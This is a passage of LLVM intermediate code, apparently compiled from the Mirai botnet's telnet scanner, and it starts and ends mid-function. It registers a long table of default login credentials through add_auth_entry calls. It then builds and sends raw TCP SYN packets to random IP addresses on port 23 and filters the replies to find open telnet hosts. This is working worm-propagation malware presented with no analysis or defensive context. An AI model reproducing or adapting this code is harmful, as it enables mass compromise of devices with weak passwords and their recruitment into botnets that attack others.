  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i16 zeroext 1)
  br label %150

; <label>:150:                                    ; preds = %1152, %104
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %151 = load i32, i32* @fake_time, align 4
  %152 = load i32, i32* %13, align 4
  %153 = icmp ne i32 %151, %152
  br i1 %153, label %154, label %218

; <label>:154:                                    ; preds = %150
  %155 = load i32, i32* @fake_time, align 4
  store i32 %155, i32* %13, align 4
  store i32 0, i32* %1, align 4
  br label %156

; <label>:156:                                    ; preds = %214, %154
  %157 = load i32, i32* %1, align 4
  %158 = icmp slt i32 %157, 760
  br i1 %158, label %159, label %217

; <label>:159:                                    ; preds = %156
  %160 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %161 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i64 1
  %163 = bitcast %struct.iphdr* %162 to %struct.tcphdr*
  store %struct.tcphdr* %163, %struct.tcphdr** %19, align 8
  %164 = call i32 @rand_next()
  %165 = trunc i32 %164 to i16
  %166 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i32, i32* @LOCAL_ADDR, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 8
  store i32 %168, i32* %170, align 4
  %171 = call i32 @get_random_ip()
  %172 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 7
  store i16 0, i16* %175, align 2
  %176 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %177 = bitcast %struct.iphdr* %176 to i16*
  %178 = call zeroext i16 @checksum_generic(i16* %177, i32 20)
  %179 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 7
  store i16 %178, i16* %180, align 2
  %181 = call zeroext i16 @htons(i16 zeroext 23) #9
  %182 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  %186 = load i32, i32* %185, align 4
  %187 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 2
  store i32 %186, i32* %188, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 6
  store i16 0, i16* %190, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %192 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %193 = bitcast %struct.tcphdr* %192 to i8*
  %194 = call zeroext i16 @htons(i16 zeroext 20) #9
  %195 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %191, i8* %193, i16 zeroext %194, i32 20)
  %196 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 6
  store i16 %195, i16* %197, align 4
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %198, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  %201 = load i32, i32* %200, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 1
  %206 = load i16, i16* %205, align 2
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %206, i16* %207, align 2
  %208 = load i32, i32* @rsck, align 4
  %209 = bitcast %union.__SOCKADDR_ARG* %20 to %struct.sockaddr**
  %210 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %210, %struct.sockaddr** %209, align 8
  %211 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %20, i32 0, i32 0
  %212 = load %struct.sockaddr*, %struct.sockaddr** %211, align 8
  %213 = call i64 @sendto(i32 %208, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %212, i32 16)
  br label %214

; <label>:214:                                    ; preds = %159
  %215 = load i32, i32* %1, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %1, align 4
  br label %156

; <label>:217:                                    ; preds = %156
  br label %218

; <label>:218:                                    ; preds = %217, %150
  store i32 0, i32* %12, align 4
  br label %219

; <label>:219:                                    ; preds = %352, %324, %312, %304, %296, %288, %280, %271, %262, %255, %248, %218
  %220 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %221 = bitcast i8* %220 to %struct.iphdr*
  store %struct.iphdr* %221, %struct.iphdr** %23, align 8
  %222 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i64 1
  %224 = bitcast %struct.iphdr* %223 to %struct.tcphdr*
  store %struct.tcphdr* %224, %struct.tcphdr** %24, align 8
  %225 = call i32* @__errno_location() #9
  store i32 0, i32* %225, align 4
  %226 = load i32, i32* @rsck, align 4
  %227 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %228 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %228, align 8
  %229 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %230 = load %struct.sockaddr*, %struct.sockaddr** %229, align 8
  %231 = call i64 @recvfrom(i32 %226, i8* %227, i64 1514, i32 16384, %struct.sockaddr* %230, i32* null)
  %232 = trunc i64 %231 to i32
  store i32 %232, i32* %21, align 4
  %233 = load i32, i32* %21, align 4
  %234 = icmp sle i32 %233, 0
  br i1 %234, label %243, label %235

; <label>:235:                                    ; preds = %219
  %236 = call i32* @__errno_location() #9
  %237 = load i32, i32* %236, align 4
  %238 = icmp eq i32 %237, 11
  br i1 %238, label %243, label %239

; <label>:239:                                    ; preds = %235
  %240 = call i32* @__errno_location() #9
  %241 = load i32, i32* %240, align 4
  %242 = icmp eq i32 %241, 11
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %239, %235, %219
  br label %364

; <label>:244:                                    ; preds = %239
  %245 = load i32, i32* %21, align 4
  %246 = sext i32 %245 to i64
  %247 = icmp ult i64 %246, 40
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %244
  br label %219

; <label>:249:                                    ; preds = %244
  %250 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 9
  %252 = load i32, i32* %251, align 4
  %253 = load i32, i32* @LOCAL_ADDR, align 4
  %254 = icmp ne i32 %252, %253
  br i1 %254, label %255, label %256

; <label>:255:                                    ; preds = %249
  br label %219

; <label>:256:                                    ; preds = %249
  %257 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 6
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %256
  br label %219

; <label>:263:                                    ; preds = %256
  %264 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = load i16, i16* %265, align 4
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @htons(i16 zeroext 23) #9
  %269 = zext i16 %268 to i32
  %270 = icmp ne i32 %267, %269
  br i1 %270, label %271, label %272

; <label>:271:                                    ; preds = %263
  br label %219

; <label>:272:                                    ; preds = %263
  %273 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 1
  %275 = load i16, i16* %274, align 2
  %276 = zext i16 %275 to i32
  %277 = load i16, i16* %2, align 2
  %278 = zext i16 %277 to i32
  %279 = icmp ne i32 %276, %278
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %272
  br label %219

; <label>:281:                                    ; preds = %272
  %282 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 4
  %284 = load i16, i16* %283, align 4
  %285 = lshr i16 %284, 9
  %286 = and i16 %285, 1
  %287 = icmp ne i16 %286, 0
  br i1 %287, label %289, label %288

; <label>:288:                                    ; preds = %281
  br label %219

; <label>:289:                                    ; preds = %281
  %290 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 4
  %292 = load i16, i16* %291, align 4
  %293 = lshr i16 %292, 12
  %294 = and i16 %293, 1
  %295 = icmp ne i16 %294, 0
  br i1 %295, label %297, label %296

; <label>:296:                                    ; preds = %289
  br label %219

; <label>:297:                                    ; preds = %289
  %298 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 4
  %300 = load i16, i16* %299, align 4
  %301 = lshr i16 %300, 10
  %302 = and i16 %301, 1
  %303 = icmp ne i16 %302, 0
